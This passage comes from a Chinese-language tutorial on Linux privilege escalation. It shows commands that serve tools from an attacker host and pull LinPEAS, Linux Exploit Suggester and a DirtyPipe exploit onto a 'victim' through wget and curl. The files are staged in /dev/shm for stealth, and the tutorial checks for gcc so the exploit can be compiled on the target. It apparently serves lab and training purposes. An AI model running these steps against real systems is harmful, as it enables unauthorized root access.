<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m http.server 80</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155354158-1026624861-42d13277a0c3440616cebbd7596d5e4e.png" width="954" height="177" class="img_ev3q"></p>
<p>现在我们可以使用 wget 或 curl 将文件下载到受害者上。</p>
<blockquote>
<p>最好有“下载”命令的选项，因为您可能会发现系统上未安装其中一个。实际上，经常会发现默认情况下没有安装curl，但wget通常是安装的。</p>
</blockquote>
<p>首先，我们需要导航到受害者上的一个可写文件夹，以将我们的工具下载到其中。大多数人喜欢使用/tmp来实现此目的，但让我们更隐蔽一点，使用另一个允许我们读写的内置目录：/dev/shm</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /dev/shm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget http://172.16.1.30/linpeas.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">curl http://172.16.1.30/linux-exploit-suggester.sh -o linux-exploit-suggester.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353654-676035850-323a6ccb97a3926260dbfb5e390fe07b.png" width="883" height="352" class="img_ev3q"></p>
<p>现在这两个工具都在受害者机器上，我们需要授予它们执行权限。可以通过以下两种方式之一添加执行位来完成。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod 755 linpeas.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chmod +x linux-exploit-suggester.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353632-310032047-ade6ae72a96a03e55d8c39c61a06fde6.png" width="672" height="113" class="img_ev3q"></p>
<blockquote>
<p>我将尝试简要地解释 755。上面有三组 RWX，分别代表用户 | 组 | 其它。二进制中的 RWX 分别为 421（r = 4、w = 2、x = 1）。数字组合可以从 1 到 7，以打开读取、写入和执行。例如，5 = r-x；7 = rwx；2 = -w-等。</p>
</blockquote>
<p>现在这两个程序都授予了执行权限，让我们看看它们可以为我们提供哪些有关内核漏洞利用的信息，从 Linux Exploit Suggester 开始。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="231linux-exploit-suggester"><strong><div id="id2.3.1">2.3.1、Linux Exploit Suggester</div></strong><a href="#231linux-exploit-suggester" class="hash-link" aria-label="231linux-exploit-suggester的直接链接" title="231linux-exploit-suggester的直接链接">​</a></h6>
<p>Linux Exploit Suggester 是一款专门用于查找内核漏洞的工具，因此从这个工具开始是有意义的。</p>
<p>我们可以简单地在受害者上执行脚本并看看它告诉我们什么。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./linux-exploit-suggester.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353452-1918876535-e664c3475fd28e0c207996249c7ae38f.png" width="844" height="820" class="img_ev3q"></p>
<p>在这里我们可以看到相当多的漏洞是“probable”，这是一个很好的迹象，表明其中一个应该有效。这些漏洞利用从新到旧按字母数字顺序输出，因此我们可以开始自上而下或自下而上地测试这些漏洞。由于最新的在顶部，所以让我们自上而下。 我们有 DirtyPipe 就在上面，所以这将是我们第一个要尝试的！</p>
<p>Exploit Suggester 为我们提供了一个下载漏洞的 URL，但我们自己已经从 Google 和 searchsploit 获得了几个副本，因此我们将继续并了解如何使用 LinPEAS 为我们查找此信息，而不是下载另一个副本。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="232linpeas"><strong><div id="id2.3.2">2.3.2、LinPEAS</div></strong><a href="#232linpeas" class="hash-link" aria-label="232linpeas的直接链接" title="232linpeas的直接链接">​</a></h6>
<p>我们可以用来寻找内核漏洞的另一个很棒的工具是 LinPEAS。</p>
<p>LinPEAS 是一款终极枚举工具，可提供大量信息。信息量如此之大，以至于让人应接不暇。因此，最好先手动枚举，然后在使用 PEAS 之前使用 Linux-Exploit-Suggester。这样，我们就可以在需要解析 LinPEAS 输出之前快速取胜。</p>
<p>一般来说，在运行 LinPEAS 时，我们会在不带参数的情况下运行它，以进行 &quot;所有检查&quot;，然后从上到下逐行检查所有输出。</p>
<blockquote>
<p>运行完整扫描时的一个好技巧是将 PEAS 的输出重定向到一个文件，以便使用 <strong>grep</strong>快速解析常见漏洞。</p>
</blockquote>
<p>对我们来说幸运的是，内核漏洞显示在系统信息部分的输出顶部附近。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./linpeas.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>首先，我们会发现 CVE 的检查位于潜在漏洞之前，这强烈表明该机器容易受到两个内核漏洞的攻击。其中一个当然是 CVE-2022-0847 或 DirtyPipe。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="252" height="95" class="img_ev3q"></p>
<p>接下来，如果我们进一步向下滚动，我们将看到 Linux-Exploit-Suggester 实际上已合并到 LinPEAS 中，因此我们看到的输出与之前的输出大致相同。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353757-1047054191-1d23afb6b2dcd491153acb21325f3217.png" width="966" height="631" class="img_ev3q"></p>
<p>这里我们看到 dirtypipe 再次名列前茅。然而，真正令人欣慰的是 CVE 的检查。这让我们在选择内核漏洞时更加有信心，因此，我们可以自信地说 dirtypipe 应该可以对抗这个目标机器。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3编译执行内核漏洞"><strong><div id="id3">3、编译/执行内核漏洞</div></strong><a href="#3编译执行内核漏洞" class="hash-link" aria-label="3编译执行内核漏洞的直接链接" title="3编译执行内核漏洞的直接链接">​</a></h2>
<p>通常，在攻击 Linux 受害者时（尤其是使用内核漏洞时），我们会发现有四种编译漏洞的方法。如果受害者机器安装了 gcc，我们可以直接在受害者机器上编译漏洞（最佳情况）；或者我们可以在攻击者机器上编译漏洞（不太好）；亦或是我们可以下载我们瞄准的内核的 VM，然后在那里编译漏洞（也不太好）；最后，我们也可以在 GitHub 上找到预编译的漏洞。</p>
<blockquote>
<p>在寻找预编译漏洞时，您可能不会在网上找到很多好的资源。可以使用的一个链接是此处的链接<a href="https://github.com/lucyoa/kernel-exploits" target="_blank" rel="noopener noreferrer">here</a>但该存储库已经 5 年没有更新了，因此缺少许多新的好漏洞。</p>
<p><strong>专业提示：</strong> 在 htb、thm 等平台上攻击机器时，最好利用这些机器开始构建您自己的预编译漏洞利用库。只需在目标计算机上编译它们，然后将它们发送回攻击者即可。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31检查受害机编译环境"><strong><div id="id3.1">3.1、检查受害机编译环境</div></strong><a href="#31检查受害机编译环境" class="hash-link" aria-label="31检查受害机编译环境的直接链接" title="31检查受害机编译环境的直接链接">​</a></h4>
<p>理想情况下，最好的情况是发现受害者安装了 gcc，这样我们就可以直接在受害者上编译漏洞。这很重要，因为内核漏洞需要在被利用的内核上编译，或者在非常接近的内核上编译。</p>
<p>有几种方法可以检查受害者是否安装了<strong>gcc 。</strong></p>
<p>首先，我们可以尝试运行 gcc 并看看它说了什么。它要么会说需要安装，要么会告诉您如何正确使用该命令。不管怎样，这都会告诉我们<strong>gcc</strong>是否在系统上。至少，它告诉我们<strong>gcc</strong>是否在我们的 PATH 中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gcc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353833-1660320640-a466ce3e2321906def0c1ede0099f369.png" width="277" height="61" class="img_ev3q"></p>
<p>这个错误告诉我们<strong>gcc</strong>已经安装了，这就完美了！现在我们知道我们将能够将漏洞利用的<strong>C</strong>文件传输到受害者上，然后在那里进行编译。</p>
<p>如果 gcc 不在你的 PATH 中，而它又说你需要安装它，那么不要马上放弃。你永远不知道 gcc 是否恰好在系统的其他地方，而不在你的 PATH 中。虽然机会渺茫，但还是应该检查一下。</p>
<p>要查找系统上gcc的所有实例，我们可以使用<strong>find</strong>命令。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">find / -iname &quot;gcc&quot; 2&gt;/dev/null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353584-959738138-023e76d11f4e4f4351237386fefcc937.png" width="533" height="395" class="img_ev3q"></p>
<p>我们可以看到这里找到了很多<strong>gcc</strong>的实例；然而，其中很多都是目录。<strong>/usr/bin/gcc</strong>位置在我们的 PATH 中置，这就是为什么我们可以通过调用命令<strong>gcc</strong>来执行它，而不需要二进制文件的完整路径。</p>
<p>再此，如果我们发现 gcc 确实没有安装，那我们就应该进行这个搜索，然后检查这些以确认它确实不在系统上，然后再放弃。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32在受害机编译并执行-dirtypipe"><strong><div id="id3.2">3.2、在受害机编译并执行 DirtyPipe</div></strong><a href="#32在受害机编译并执行-dirtypipe" class="hash-link" aria-label="32在受害机编译并执行-dirtypipe的直接链接" title="32在受害机编译并执行-dirtypipe的直接链接">​</a></h4>
<p>现在我们已经发现受害者上安装了gcc ，我们可以继续通过 HTTP 服务器再次发送我们的漏洞利用程序。</p>
<p>在这个例子中，我们将使用通过searchsploit发现的漏洞，并将其重命名为dirty_pipe.c</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353833-210300440-f6f356ed9a205c76947e6902b7f0c47f.png" width="725" height="162" class="img_ev3q"></p>
<p>然后再次使用curl，我们可以将文件下载到受害者的 <strong>/dev/shm</strong> 目录中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/dirty_pipe.c -o dirty_pipe.c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353238-1006726555-9bafc9388ec624d143d4d569f461c54e.png" width="677" height="156" class="img_ev3q"></p>
